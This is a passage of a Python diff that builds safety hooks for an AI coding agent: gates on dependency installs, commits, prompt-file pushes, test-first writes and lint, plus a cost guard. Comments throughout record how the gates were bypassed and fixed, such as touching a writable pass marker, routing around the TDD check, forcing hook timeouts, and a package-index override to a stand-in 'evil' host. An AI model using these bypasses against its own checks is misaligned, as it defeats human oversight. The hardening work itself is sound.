+                if _is_flag_value(tok, last_flag):
+                    continue
+            if tok in ("-r", "--requirement", "-c", "--constraint"):
+                # Packages listed in a FILE are invisible to the gate;
+                # allowing them would defeat it entirely. Shell parity.
+                return ("Dependency gate: cannot verify packages listed in "
+                        "a file.\\nInstall them explicitly, or approve in "
+                        ".claude/steering/deps.md.", "")
+            last_flag = tok
+            # The `--flag=value` spelling never reaches the value branch.
+            if "=" in tok and "://" in tok.split("=", 1)[1]:
+                return (_SRC_OVERRIDE_REASON
+                        % (tok.split("=", 1)[0], tok.split("=", 1)[1]), "")
+            # The ATTACHED spelling (`-ihttp://evil/simple`) is the same
+            # override as the separated one and the shell's `-i?*|-f?*`
+            # globs deny it; it used to reach `tok.startswith("-")` below
+            # and be skipped as an ordinary flag. Same arm, so the operator
+            # gets the same reason the separated spelling gets.
+            if tok in _INDEX_FLAGS or _is_attached_index_flag(tok):
+                return ("Dependency gate: a package-index override is not "
+                        "verifiable.\\nIt redirects even an APPROVED package "
+                        "to another server. Remove it,\\nor set the index in "
+                        "the project\'s own package-manager config.", "")
+            if tok in _VALUE_FLAGS:
+                skip_next = True
+                continue
+            if tok == "." or tok.startswith(("./", "/", "../")):
+                continue                  # local path install, not a registry
+            if tok.startswith("-"):
+                continue
+            name_only = _pkg_name(tok)
+            if name_only and name_only not in approved:
+                blocked += " " + name_only
+    return (None, blocked)
+
+
+def _test_gate(config):
+    test_cmd = (config["commands"].get("test") or "").strip()
+
+    async def test_gate(input_data, tool_use_id, context):
+        # Block `git commit` unless the configured test command passes.
+        #
+        # [lens A F4] THE PASS MARKER IS GONE, on this substrate too. The
+        # gate used to skip the run when `.claude/.last-test-pass` existed
+        # and no source file was newer. That file is gitignored and
+        # agent-writable and no gate protects it, so `touch
+        # .claude/.last-test-pass` disabled the gate for the next commit.
+        # Verifying its CONTENT is not a repair: whatever the gate can
+        # compute from the tree, an agent holding a Write tool can compute
+        # and write too. The only honest fix is to have no trusted input.
+        # Removed with it: the src/-vs-lib/ staleness walk (and with it
+        # backlog I-5, which was a divergence between two caches that no
+        # longer exist).
+        cmd = _cmd_of(input_data)
+        if not _git_verb(cmd, "commit"):
+            return {}
+        proj = _proj()
+        if not test_cmd:
+            # fail-loud-on-empty-commands: parity with the shell
+            # interpolation site "echo 'TODO: commands.test unset' >&2 &&
+            # exit 127" (AC-7-2) - deny, never allow-by-omission.
+            return _deny("TODO: commands.test unset\\n"
+                         "Commit blocked: test command not found (exit 127)")
+        # [WP2] The deny reason carries WHAT failed: the runner's merged
+        # output, cut as the shell's `tail -n N | tail -c B` cuts it (see
+        # _run_tail), after the reason line (the shell prints it before).
+        # The output used to be discarded here. Split on "\\n" only, as tail
+        # counts lines; a final newline ends a line.
+        rc, out = await _run_tail(test_cmd, cwd=proj)
+        if rc == 0:
+            return {}
+        tail = out.split("\\n")
+        if tail[-1] == "":
+            tail.pop()
+        detail = "".join("\\n" + ln for ln in tail)
+        if rc == 127:
+            # Parity with the shell's P2-5 branch: the toolchain being
+            # absent is not a red suite, and saying so sends the operator
+            # to debug the wrong thing.
+            return _deny("Commit blocked: test command not found (exit 127): "
+                         + test_cmd + detail)
+        if rc == 5 and _NO_TESTS_RC5.fullmatch(test_cmd):
+            # [WP1] Shell parity: pytest / `python -m unittest` exit 5 is
+            # "no tests collected", allowed with a notice to the user
+            # (systemMessage) and the model (additionalContext). No
+            # permissionDecision, so the normal permission flow applies.
+            return {"systemMessage": _NO_TESTS_NOTICE,
+                    "hookSpecificOutput": {
+                        "hookEventName": "PreToolUse",
+                        "additionalContext": _NO_TESTS_NOTICE}}
+        if rc == 1 and _UNITTEST_RC1.fullmatch(test_cmd) and tail:
+            # [WP3 fix 8] Shell parity: unittest's start directory does not
+            # exist (see sdk_gates_template.NO_START_DIR_RE). The path is
+            # relative to proj, where the command ran.
+            m = _NO_START_DIR.fullmatch(tail[-1])
+            if m and not os.path.exists(os.path.join(str(proj),
+                                                      m.group(1))):
+                return {"systemMessage": _NO_START_DIR_NOTICE,
+                        "hookSpecificOutput": {
+                            "hookEventName": "PreToolUse",
+                            "additionalContext": _NO_START_DIR_NOTICE}}
+        return _deny("Commit blocked: tests failing (exit %d)." % rc
+                     + detail)
+    return test_gate
+
+
+# [round-4 D4] Shell parity, verbatim: the emitted hook's case arms are
+# `*[Pp]rompt*|prompts/*|*/prompts/*`. A path that NAMES a prompt, not every
+# markdown file in the tree.
+_PROMPT_PATH = re.compile(r"[Pp]rompt|(?:^|/)prompts/")
+
+
+async def _git_fs(args, proj):
+    """[PR #120 step 7, EP-1] (rc, stdout) of `git <args>` run in proj;
+    stdout is decoded with os.fsdecode, so a name that is not valid UTF-8
+    still names its file. _run's errors="replace" turned such a name into
+    U+FFFD, `top / f` named no file, and a stale marker passed here while
+    the shell denied."""
+    try:
+        proc = await asyncio.create_subprocess_exec(
+            "git", *args, cwd=str(proj),
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.DEVNULL)
+        out, _ = await proc.communicate()
+        return proc.returncode, os.fsdecode(out or b"")
+    except OSError:
+        return 1, ""           # mirrors shell `2>/dev/null`
+
+
+def _shown(name):
+    """A path from _git_fs as text that can be shown (lone surrogates from
+    an undecodable byte become U+FFFD)."""
+    return os.fsencode(name).decode("utf-8", errors="replace")
+
+
+async def _eval_names(args, proj):
+    """[WP2 review SC-2, SDK-P3] (git's status, the prompt paths among the
+    NUL-separated names `git <args>` prints). Newline-separated, git
+    C-quotes a name with a non-ASCII byte, a `"` or a control character, and
+    the quoted name named no file. Shell parity (_ev_names)."""
+    rc, out = await _git_fs(args, proj)
+    return rc, [f for f in out.split("\\0") if f and _PROMPT_PATH.search(f)]
+
+
+def _eval_gate(config):
+    eval_cmd = (config["commands"].get("eval") or "").strip()
+
+    async def eval_gate(input_data, tool_use_id, context):
+        # Block `git push` touching prompt files unless an eval passes.
+        # [WP2 / D9] With commands.eval set, RUN it (as test_gate runs
+        # commands.test); the .claude/.last-eval-pass marker is read only
+        # when no eval command is configured, and must then be newer than
+        # every touched prompt file (PRD :775). Shell parity.
+        #
+        # [WP2 fix round 2, operator decision 2026-10-04] Pushes only. A
+        # local merge is not gated: a PreToolUse hook runs before the merge
+        # and cannot see the incoming tree, and the push that follows
+        # evaluates the merged tree before anything leaves the machine.
+        cmd = _cmd_of(input_data)
+        if not _git_verb(cmd, "push"):
+            return {}
+        proj = _proj()
+        # Inspect the WHOLE outgoing range, not just the newest commit:
+        # a push can carry many commits, and a prompt change two commits
+        # back must still gate. Prefer @{u}..HEAD (what will actually be
+        # pushed); fall back to HEAD~1 when no upstream is configured.
+        #
+        # [round-4 D4] THE ROOT-COMMIT FALLBACK IS NEW HERE, and it is a
+        # fail-open the shell did not have. On a shallow clone -
+        # `actions/checkout` defaults to `--depth 1` - there is no upstream
+        # and no HEAD~1, so BOTH ranges failed, `diff` stayed empty, and the
+        # gate allowed. That is the CI shape, i.e. the one that matters. The
+        # shell has always had a third `git ls-tree -r HEAD` branch; this
+        # substrate did not.
+        #
+        # Read the correction in the round-4 brief carefully, because the
+        # obvious reading is wrong: this is NOT "the shell is the complete
+        # one and the SDK should copy it". The shell only ever diffs HEAD~1
+        # and never `@{u}..HEAD`, so a push carrying two or more commits
+        # whose prompt change is not in the newest one is shell=allow /
+        # sdk=deny - a SHELL fail-open, recorded as backlog J-18. Each
+        # substrate had a range the other lacked. Both now carry both.
+        # [WP2 / X-36z] ...and the shell's upstream range was dead code until
+        # WP2 (a doubled-brace revision in a non-f-string body).
+        # [round-4 D4] The predicate was `prompt|\\.md$`, which makes every
+        # markdown file a prompt file. Survivable on a two-commit diff and
+        # catastrophic once the root-commit branch below feeds it the WHOLE
+        # TREE: it matches README.md and refuses every CI push. The shell
+        # narrowed this in round 3 and this substrate was left behind, so a
+        # docs-only push was shell=allow / SDK=DENY. Narrowed to paths that
+        # actually name a prompt - shell parity, same three shapes
+        # (_eval_names).
+        prompts = []
+        for rng in ("@{u}..HEAD", "HEAD~1"):
+            rc, names = await _eval_names(
+                ["diff", "--name-only", "-z", rng], proj)
+            if rc == 0:
+                prompts = names
+                break
+        else:
+            # No upstream and no parent: a ROOT commit, which introduces
+            # every prompt file the repo has and was the one push this gate
+            # never inspected. [WP2 review SC-2] `--full-tree`: from a
+            # subdirectory (proj below the repo top), ls-tree lists only
+            # that subdirectory, relative to it.
+            rc, names = await _eval_names(
+                ["ls-tree", "-r", "--full-tree", "--name-only", "-z",
+                 "HEAD"], proj)
+            if rc == 0:
+                prompts = names
+        if not prompts:
+            return {}
+        if eval_cmd:
+            # [WP2 / D9] Shell parity with test_gate: merged output, cut by
+            # _run_tail, after the reason line.
+            rc, out = await _run_tail(eval_cmd, cwd=proj)
+            if rc == 0:
+                return {}
+            tail = out.split("\\n")
+            if tail[-1] == "":
+                tail.pop()
+            detail = "".join("\\n" + ln for ln in tail)
+            if rc == 127:
+                return _deny("Push blocked: eval command not found "
+                             "(exit 127): " + eval_cmd + detail)
+            return _deny("Push blocked: evals failing (exit %d)." % rc
+                         + detail)
+        mark = proj / ".claude" / ".last-eval-pass"
+        if not mark.is_file():
+            return _deny("Eval gate: run evals before pushing prompt "
+                         "changes.")
+        # [WP2 / D9] Newer than every touched prompt file still in the
+        # working tree, to the nanosecond - the shell's `-nt`. [WP2 review
+        # SC-2] git names a path from the repo top, which is not proj when
+        # the project is a subdirectory of the repo.
+        m_ns = mark.stat().st_mtime_ns
+        rc, out = await _git_fs(["rev-parse", "--show-toplevel"], proj)
+        top = Path(out.rstrip("\\n")) if rc == 0 and out.rstrip("\\n") \\
+            else proj
+        for f in prompts:
+            p = top / f
+            if p.exists() and not m_ns > p.stat().st_mtime_ns:
+                return _deny("Eval gate: %s changed after the last eval "
+                             "pass; run evals again before pushing." % _shown(f))
+        return {}
+    return eval_gate
+
+
+# [round-4 D11] Directories whose contents are not the project's tests:
+# vendored code, build output, tool caches, and the bootstrap install's own
+# artifacts. Shell parity - the emitted `find` prunes exactly this set.
+_TDD_PRUNE = frozenset({
+    ".git", ".claude", "node_modules", "vendor", ".venv", "venv",
+    "target", "dist", "build", "__pycache__", ".tox", ".mypy_cache",
+    "site-packages", ".next",
+})
+
+
+def _tdd_is_test_path(rel):
+    # [WP2 tdd-test-paths] Writing a test or a package marker is the
+    # test-first step itself, so it is never policed (build plan blocker 5).
+    # The stem search below skips the target, so no test file and no
+    # `__init__.py` could satisfy it: under `tdd_policy: required` every
+    # colocated Jest test, every Maven `src/test/java` class, every Go
+    # `_test.go` and every package `__init__.py` was refused on an empty
+    # project, on both substrates. One path component per match, case-
+    # sensitive - shell parity (the emitted `case` arms, same constants).
+    parts = rel.split("/")
+    if any(fnmatch.fnmatchcase(parts[-1], g) for g in _TDD_TEST_BASENAMES):
+        return True
+    if any(fnmatch.fnmatchcase(d, g)
+           for d in parts[1:-1] for g in _TDD_TEST_DIRS):
+        return True
+    return (parts[0] == "src" and len(parts) > 2
+            and any(fnmatch.fnmatchcase(parts[1], g)
+                    for g in _TDD_TEST_SOURCE_SETS))
+
+
+def _tdd_gate(config):
+    async def tdd_gate(input_data, tool_use_id, context):
+        # Block a Write to source unless a matching test EXISTS.
+        #
+        # [round-3 lens C] This used to require a test newer than the
+        # target, and to deny when the target did not exist - which made
+        # creating any new source file impossible even with the test
+        # already written, since a file being created never exists. The
+        # only escape was to `touch` it through Bash first, i.e. the gate's
+        # sole recourse was routing around the gate. The `-newer` ordering
+        # signal was forgeable by `touch` anyway. It also searched only a
+        # hard-coded `tests/`, which Maven/Gradle, Go, Elixir and per-package
+        # monorepos can never satisfy. Shell parity (the find sweep).
+        raw = _tool_input(input_data).get("file_path") or ""
+        if not raw:
+            return {}
+        proj = _proj()
+        # Claude Code passes ABSOLUTE file paths; normalize to project-
+        # relative before the src/|lib/ test (a bare re.match on an
+        # absolute path never matches, silently disabling the gate).
+        if os.path.isabs(raw):
+            # [WP3 fix1 SDKP-3] Shell parity: CLAUDE_PROJECT_DIR as spelled
+            # (lexically normalized, as _tdd_normpath does), then the
+            # physical spelling _proj() resolved. The resolved root alone
+            # split a symlinked project from the shell both ways.
+            _cpd = os.environ.get("CLAUDE_PROJECT_DIR") or ""
+            _bases = ([os.path.normpath(_cpd)] if os.path.isabs(_cpd)
+                      else []) + [str(proj)]
+            try:
+                for _base in _bases:
+                    rel = os.path.relpath(raw, _base)
+                    if rel != ".." and not rel.startswith("../"):
+                        break
+            except ValueError:         # different drive (Windows) - give up
+                return {}
+        else:
+            rel = raw
+        # A leading `./` is the same path and must reach the same matcher.
+        # The shell twin strips it; without this the two substrates split on
+        # `./src/x.py` (shell deny, SDK allow) - a divergence introduced by
+        # the F-1393 fix itself, caught by the corpus row added with it.
+        #
+        # [WP2 review SDK-P5] Lexically normalized (`.`, `..`, `//`), for
+        # the relative spelling too: the test-path exemption reads path
+        # segments, so `src/tests/../core.py` passed as a test path while it
+        # names `src/core.py`. relpath normalized only the ABSOLUTE spelling,
+        # and the shell normalized neither, so the substrates split both
+        # ways. A path that resolves outside the project starts with `..`,
+        # is not under src/ or lib/, and is never exempt as a test path.
+        # Shell parity (_tdd_normpath, the same posixpath.normpath rules).
+        rel = os.path.normpath(rel)
+        while rel.startswith("./"):
+            rel = rel[2:]
+        # [WP3 agents-handoff] An isolation:worktree implementer writes under
+        # .claude/worktrees/<n>/ while CLAUDE_PROJECT_DIR is the main
+        # checkout, so `rel` was never src/ or lib/ and every write in a
+        # worktree was allowed (measured on both substrates at 3d866f4).
+        # Gate the path inside the worktree and search that worktree for its
+        # test. A worktree directory that does not exist leaves the search
+        # at the project root, as the shell's failed `cd` leaves its `find`
+        # where the hook started. Shell parity (the `.claude/worktrees/*/*`
+        # arm after _tdd_normpath).
+        root = proj
+        _wt = rel.split("/")
+        if len(_wt) > 3 and _wt[0] == ".claude" and _wt[1] == "worktrees":
+            if (proj / ".claude" / "worktrees" / _wt[2]).is_dir():
+                root = proj / ".claude" / "worktrees" / _wt[2]
+            rel = "/".join(_wt[3:])
+        if not re.match(r"(src|lib)/", rel):
+            return {}
+        if _tdd_is_test_path(rel):
+            return {}
+        stem = os.path.basename(rel)
+        stem = stem.rsplit(".", 1)[0] if "." in stem else stem
+        tpath = root / rel
+        found = False
+        low = stem.lower()
+        for cand in root.rglob("*"):
+            # [round-4 D11] `.git` was the ONLY pruned directory, so a test
+            # nobody wrote satisfied the gate: `node_modules/p/dist/
+            # test_zzz.js` satisfied `src/zzz.py` on both substrates, and on a
+            # pristine install `.claude/commands/spec-new.md` satisfied
+            # `src/new.py` while `.claude/hooks/spec-gate-entry.sh` satisfied
+            # `lib/a.ts` - the gate was near-vacuous out of the box, before
+            # any user code existed. Shell parity (the same pruned set).
+            #
+            # RELATIVE parts, not `cand.parts`. The absolute path includes
+            # every ancestor of the project, so the pre-existing
+            # `".git" in cand.parts` disabled this gate entirely for any
+            # project living under a directory named `.git` - and with the
+            # wider set above it would have covered `build`, `dist`, `vendor`
+            # and `.claude`, which are ordinary parent-directory names. Found
+            # by executing the fix against a project under `~/.claude/`:
+            # every candidate was pruned and every write was refused.
+            try:
+                parts = cand.relative_to(root).parts
+            except ValueError:
+                continue
+            if _TDD_PRUNE & set(parts):
+                continue
+            if not cand.is_file() or cand == tpath:
+                continue
+            nm = cand.name.lower()
+            if low in nm and ("test" in nm or "spec" in nm):
+                found = True
+                break
+        if not found:
+            return _deny(f"TDD gate: write a failing test for {stem} "
+                         f"before {rel}.")
+        return {}
+    return tdd_gate
+
+
+# [WP2 re-review RS-3] The empty-lint notice is shown once per session. The
+# marker is the shell hook's: .claude/sessions/.lint-unset-<session id>, the
+# id taken from the payload, else CLAUDE_SESSION_ID, else "default", and
+# replaced by "default" when it holds any character outside [A-Za-z0-9._-].
+# A symlink at the marker is removed, never written through (O_NOFOLLOW
+# covers a link planted after the removal). Markers older than 7 days
+# (find's -mtime +7: 8 whole days) are purged on EVERY call, before the
+# marker is checked, so a stale marker expires ([WP2 re-review C3], shell
+# parity). Trailing newlines are stripped from the id before the check, as
+# the shell's `$( )` strips them from the payload's id ([WP2 re-review C4]):
+# "abc\\n" keys .lint-unset-abc on both substrates. The environment's id is
+# not stripped on either.
+# Returns True when the notice was already shown this session.
+_SESSION_ID_RE = re.compile(r"[A-Za-z0-9._-]+\\Z")
+
+
+def _lint_unset_purge(sdir):
+    try:
+        now = time.time()
+        for name in os.listdir(sdir):
+            p = os.path.join(sdir, name)
+            if (name.startswith(".lint-unset-") and os.path.isfile(p)
+                    and not os.path.islink(p)
+                    and (now - os.lstat(p).st_mtime) // 86400 > 7):
+                os.remove(p)
+    except OSError:
+        pass
+
+
+def _lint_unset_shown(proj, input_data):
+    sid = None
+    if isinstance(input_data, dict):
+        sid = input_data.get("session_id")
+    if isinstance(sid, str):
+        sid = sid.rstrip("\\n")
+    if not isinstance(sid, str) or not sid:
+        sid = os.environ.get("CLAUDE_SESSION_ID") or "default"
+    if not _SESSION_ID_RE.match(sid):
+        sid = "default"
+    sdir = os.path.join(str(proj), ".claude", "sessions")
+    _lint_unset_purge(sdir)
+    mark = os.path.join(sdir, ".lint-unset-" + sid)
+    if os.path.islink(mark):
+        try:
+            os.remove(mark)
+        except OSError:
+            pass
+    if os.path.exists(mark) and not os.path.islink(mark):
+        return True
+    if not os.path.islink(mark):
+        try:
+            os.makedirs(sdir, exist_ok=True)
+            os.close(os.open(mark, os.O_WRONLY | os.O_CREAT
+                             | getattr(os, "O_NOFOLLOW", 0), 0o644))
+        except OSError:
+            pass
+    return False
+
+
+def _format_lint_gate(config):
+    # [upstream P2-6] commands.format is deliberately NOT read here.
+    lint = (config["commands"].get("lint") or "").strip()
+
+    async def format_lint_gate(input_data, tool_use_id, context):
+        # PostToolUse: non-blocking lint feedback, exactly like the shell
+        # gate (it never denies).
+        # [upstream P2-6] The FORMAT command is no longer run here. It is
+        # a mutating command with no file-type filter, so it reformatted
+        # files the agent never touched, project-wide, on every edit - a
+        # PostToolUse hook must not rewrite the tree behind the operator.
+        # Lint only; it reports and never mutates. Shell parity.
+        proj = _proj()
+        if not lint:
+            # [WP2 I-6(a)] An empty lint checked nothing in silence. Say so,
+            # to the user, as the shell hook does. Shell parity.
+            # [WP2 re-review RS-3] Once per session, as the shell does.
+            if _lint_unset_shown(proj, input_data):
+                return {}
+            return {"systemMessage": _LINT_UNSET_NOTICE}
+        # merge=True mirrors the shell's `2>&1 | tail -n N`: the last N
+        # lines of the CHRONOLOGICALLY interleaved stream, not stdout-
+        # then-stderr (which would reorder an interleaved summary).
+        rc, out, _ = await _run(lint, cwd=proj, shell=True, merge=True)
+        # [WP2 channels] Only a FAILING lint is reported, to the MODEL
+        # (additionalContext; systemMessage reached only the user), with
+        # the shell's wording and the same _LINT_CONTEXT_MAX byte cut. A
+        # passing run says nothing, or "All checks passed!" would ride on
+        # every Write/Edit result.
+        if rc == 0:
+            return {}
+        if rc < 0:
+            rc = 128 - rc    # killed by signal N: the shell's $? is 128+N
+        # The shell's `tail` inside `$( )`: a final newline does not start
+        # one more line, and command substitution strips trailing newlines.
+        lines = out.split("\\n")
+        if out.endswith("\\n"):
+            lines = lines[:-1]
+        tail = ("\\n".join(lines[-_LINT_TAIL_LINES:]).rstrip("\\n")
+                or "(no output)")
+        msg = (f"Lint (commands.lint) failed with exit {rc} after this "
+               f"edit. Last {_LINT_TAIL_LINES} lines:\\n{tail}")
+        # The shell cuts BYTES (its encoder is quadratic in bash); cut the
+        # same bytes here so both substrates hand the model the same text.
+        raw = msg.encode("utf-8", errors="surrogateescape")
+        if len(raw) > _LINT_CONTEXT_MAX:
+            msg = (raw[:_LINT_CONTEXT_MAX].decode("utf-8", errors="replace")
+                   + "\\n[truncated]")
+        return {"hookSpecificOutput": {"hookEventName": "PostToolUse",
+                                       "additionalContext": msg}}
+    return format_lint_gate
+
+
+# [X-51] THE COST GUARD'S SDK HALF. Shell parity: `_cost_guard` in the header,
+# called from `_read_cmd`, with the SAME two numbers.
+#
+# THIS SIDE HAS NO COST PROBLEM AND STILL NEEDS THE GUARD. The payloads that
+# push a shell gate past its timeout cost this module 0.10-0.45 s, because it
+# walks in Python rather than in bash. The guard is here for PARITY, which is
+# this repo's central invariant: without it the same command is shell-DENY (the
+# guard fired) and SDK-allow, a divergence manufactured by the fix itself. That
+# has happened twice already on the X-46 mirror; it is not happening a third
+# time.
+#
+# BYTES, matching the shell's `local LC_ALL=C` scoping exactly. `len(str)` counts
+# code points and the shell's `${#var}` counts whatever the locale says, so the
+# comparison is done on the UTF-8 ENCODING on both sides - X-47's split, not
+# re-opened here. `surrogatepass` for `_budget_len`'s reason: a command arrives
+# through JSON and a lone surrogate must weigh what it weighs to bash rather
+# than crash a PreToolUse hook. Every member of the jump set is ASCII, so
+# counting set BYTES in the byte prefix is identical to what bash counts in the
+# same prefix under the C locale, multibyte padding included.
+_CMD_MAXLEN = 81920
+_CMD_MAXJUMP = 8191
+_JUMP_BYTES = b"()\\\"'`$"
+
+
+def _cost_guard(input_data):
+    """`None` if the command is cheap enough to gate, else a deny decision.
+
+    Two conditions, and this guard does not claim they are all of them.
+    TOKEN COUNT was a third cost term it does not measure (X-52): a command of
+    40000 `! ` tokens has ZERO jump targets, sits under the length cap, and
+    cost the shell 139.58 s against a 60 s ceiling. FIXED 2026-08-12 by
+    removing the term rather than adding a condition here - the shell walk's
+    per-token tail rebuild was quadratic; the walk now steps a few tokens
+    lazily and only a walk still going after that splits the remainder,
+    so the same shapes DENY in 6.2 s. The COST CLASS is not closed - a wrapper
+    head still runs the walk to the end of the tail on every quoted run (X-54,
+    open) - but that is a shell cost property too and this side is unaffected. Nothing changed on THIS side: the fix is a
+    shell cost property, THIS MODULE'S verdicts are unchanged, and it was
+    already paying 0.10-0.45 s for those shapes. CORRECTED 2026-08-13: this
+    used to say flatly "it moves no verdict", and scoped to the whole fix that
+    is FALSE - b1fcc85's memo was a live dependency-gate bypass on the SHELL
+    side (main=DENY / tip=ALLOW), fixed in 0d24cc3, and the differential grew
+    4092 -> 4104 rows to carry it. What survives is the narrow claim: the
+    Python substrate's own verdicts did not move, which is why the new rows
+    are all shell==sdk. See freeze-exception no. 66. What these two close is the length and
+    density classes. Neither
+    predicate catches the other's class (measured on a benign corpus of this
+    repo's own files against the adversarial shapes):
+
+      LENGTH   total bytes. No substitution bound touches it - a 256 KB `-m`
+               argument costs the shell 87 s and a 256 KB heredoc 142 s with no
+               `$(` anywhere. Benign max 65556, cap 81920.
+      DENSITY  jump-target bytes in the first `_SUBST_SCANMAX` bytes, one walk
+               iteration each. Benign max 1306, the >30 s shapes start at
+               16379, cap 4096.
+    """
+    # THROUGH `_cmd_spellings`, NOT a second `.get("command")`. This module
+    # holds exactly ONE read site and tests/test_issue_fixes.py pins it there
+    # (a second reader gets an un-normalized string and re-opens the whole P4
+    # class). `_unf` is the raw spelling and is `""` precisely when the fold
+    # changed nothing, so `_unf or _norm` reconstructs the RAW command - which
+    # is what the shell half guards (`_cost_guard "$_rc_raw"`), so the two
+    # measure the same string.
+    _norm, _unf, _ = _cmd_spellings(input_data)
+    raw = _unf or _norm
+    if not raw:
+        return None
+    enc = raw.encode("utf-8", "surrogatepass")
+    if len(enc) > _CMD_MAXLEN:
+        return _deny(
+            f"command is {len(enc)} bytes, over the {_CMD_MAXLEN}-byte gate "
+            f"limit: it cannot be scanned inside this hook's timeout, and a "
+            f"gate that runs out of time is SKIPPED rather than obeyed, so it "
+            f"is refused instead of allowed unscanned")
+    # [X-50] THE WHOLE COMMAND, not a prefix - the prefix form was a live
+    # bypass of this guard (17 KB of clean padding then 9000 quoted runs scores
+    # zero in the prefix and costs the shell 62.72 s). Shell parity: the twin
+    # counts the whole string too.
+    jumps = sum(enc.count(bytes((b,))) for b in _JUMP_BYTES)
+    if jumps > _CMD_MAXJUMP:
+        return _deny(
+            f"command holds {jumps} shell delimiters in its first "
+            f"{_SUBST_SCANMAX} bytes, over the {_CMD_MAXJUMP} limit: it cannot "
+            f"be scanned inside this hook's timeout, and a gate that runs out "
+            f"of time is SKIPPED rather than obeyed, so it is refused instead "
+            f"of allowed unscanned")
+    return None
+
+
+def _with_cost_guard(factory):
+    """Apply `_cost_guard` in front of every gate, at ONE site.
+
+    Wrapping the factory table rather than editing each gate is deliberate: the
+    shell half is a single call inside `_read_cmd`, and five separate per-gate
+    copies here is precisely the shape D3 records going wrong (one copy not
+    growing with the others). Gates whose tool carries no `command` - tdd-gate
+    on Write, format-lint-gate on PostToolUse - read an empty string and the
+    guard returns None, so this is inert for them rather than special-cased.
+    """
+    def _factory(config):
+        inner = factory(config)
+
+        async def _guarded(input_data, tool_use_id, context):
+            blocked = _cost_guard(input_data)
+            if blocked is not None:
+                return blocked
+            return await inner(input_data, tool_use_id, context)
+        # KEEP THE INNER CLOSURE'S IDENTITY. tests/test_sdk_gates.py's F7 check
+        # identifies the gate wired onto a surface by `hooks[0].__name__`, and
+        # that check exists because its predecessor asserted a symbol that never
+        # existed and was unconditionally true. A wrapper that renamed every
+        # gate to `_guarded` would blind it again - the same failure, one layer
+        # out. Copied by hand rather than with functools.wraps to avoid adding
+        # an import to the emitted module.
+        _guarded.__name__ = inner.__name__
+        _guarded.__qualname__ = getattr(inner, "__qualname__", inner.__name__)
+        return _guarded
+    return _factory
+
+
+_GATE_FACTORIES = {
+    name: _with_cost_guard(factory) for name, factory in {
+        "secrets-gate": _secrets_gate,
+        "spec-gate-commit": _spec_gate_commit,
+        "dependency-gate": _dependency_gate,
+        "test-gate": _test_gate,
+        "eval-gate": _eval_gate,
+        "tdd-gate": _tdd_gate,
+        "format-lint-gate": _format_lint_gate,
+    }.items()
+}
+# PRIMARY event/matcher per gate - mirrors templates.HOOK_EVENT_MAP, which is
+# the shell suite's settings.json wiring. One entry per gate, exactly as the
+# shell table has, so the two can be compared for equality.
+_GATE_MATCHERS = {
+    "secrets-gate": ("PreToolUse", "Read|Write|Edit|NotebookEdit|Grep|Glob"),
+    "spec-gate-commit": ("PreToolUse", "Bash"),
+    "dependency-gate": ("PreToolUse", "Bash"),
+    "test-gate": ("PreToolUse", "Bash"),
+    "eval-gate": ("PreToolUse", "Bash"),
+    "tdd-gate": ("PreToolUse", "Write"),
+    "format-lint-gate": ("PostToolUse", "Write|Edit"),
+}
+# ADDITIONAL registrations for a gate that must guard more than one tool
+# surface - the mirror of templates.HOOK_EXTRA_EVENTS, kept separate for the
+# same reason: the seam §7.2 tier partition is keyed on gate NAME, one entry
+# per gate, and must not be perturbed by a second matcher.
+#
+# [lens A F7] This table did not exist. settings.json registered the shell
+# secrets-gate on BOTH `Bash` and the file matchers at v2.6.0 (P0-2), while
+# the comment above claimed _GATE_MATCHERS "mirrors the shell suite's
+# settings.json wiring; tests assert the two stay in sync" - it carried only
+# the primary matcher, and the test that was supposed to assert the
+# divergence checked a symbol (`_BASH_GATES`) that has never existed in this
+# repo, so `getattr(..., {})` made it unconditionally true. Both the claim
+# and its guard were empty. tests/test_sdk_gates.py now asserts this table
+# against templates.HOOK_EXTRA_EVENTS by equality.
+_GATE_EXTRA_MATCHERS = {
+    "secrets-gate": [("PreToolUse", "Bash")],
+}
+# Command-running gates get explicit generous timeouts. At the seam
+# runtime floor (Claude Code >= 2.1.210) a PreToolUse hook timeout fails
+# CLOSED - the tool call is blocked - so a timeout is a refusal, never a
+# silent allow.
+# [round-4 D15] `secrets-gate: 60` was missing here while the shell's TIMEOUTS
+# emits exactly that into settings.json - an unrecorded divergence in the
+# DECLARED contract, not just in behaviour. The two substrates now declare the
+# same bound. It is not reachable on this substrate in practice (measured
+# ~0.6 ms/line against the shell's ~5.4 ms/line after the D15 fix, so 60 s
+# lands near 100,000 lines), which is the point: an unreachable bound costs
+# nothing and a missing one has to be rediscovered by whoever next compares
+# the two files.
+# [X-36l] dependency-gate joins the table. It matches every Bash call, shares
+# secrets-gate's superlinear tokenizer, and carries an install anchor with
+# nested quantifiers on top - and it had no ceiling on EITHER substrate, which
+# is what let a cubic scan run ~66 s here while the shell denied the same
+# command in ~1.2 s. [CORRECTED 2026-08-13, X-51] This used to read "A PreToolUse
+# timeout fails CLOSED at the seam's runtime floor, so the bound refuses a
+# pathological command rather than allowing one." IT IS THE OPPOSITE. A hook
+# cancelled at its declared timeout exits 124/137/143; only exit 2 blocks; the
+# call PROCEEDS. Crossing the ceiling is a BYPASS, not a refusal, so a timeout is
+# a budget the attacker spends - not a bound that saves you.
+# Shell parity (templates.TIMEOUTS).
+# [WP2 / D9] eval-gate joins at test-gate's 600 s, now that it runs
+# commands.eval. ON THIS SUBSTRATE THE BOUND FAILS CLOSED: an Agent SDK
+# callback that outruns its HookMatcher timeout BLOCKS the call (hooks
+# reference, Timeouts), whereas the shell hook killed at the same 600 s fails
+# OPEN. So an eval suite slower than the bound is denied here and allowed by
+# the shell - accepted and recorded by the operator on 2026-10-03, the same
+# split test-gate's 600 s already has. (The X-51 note above is about the
+# shell hook; it is not this substrate's timeout behaviour.)
+_GATE_TIMEOUTS = {"test-gate": 600.0, "format-lint-gate": 120.0,
+                  "secrets-gate": 60.0, "dependency-gate": 60.0,
+                  "eval-gate": 600.0}
+
+
+# Canonical order of the SDK-carried gate universe (insertion order of
+# the factory table). build_hooks derives MEMBERSHIP from the caller's
+# config in this order, never from a stale frozen list.
+_GATE_ORDER = tuple(_GATE_FACTORIES)
+
+
+def _enabled_gates(config):
+    # Membership tracks the CALLER's config, not the emission-time GATES
+    # snapshot: a config that now warrants more gates than at emission
+    # (tdd_policy flipped to required, eval-gate turned on) gets them. A
+    # config carrying a NON-EMPTY `_resolved_hooks` (a full resolved
+    # project config, e.g. Tessera's or the emitted RESOLVED_CONFIG) is
+    # authoritative. A missing OR EMPTY `_resolved_hooks` falls back to
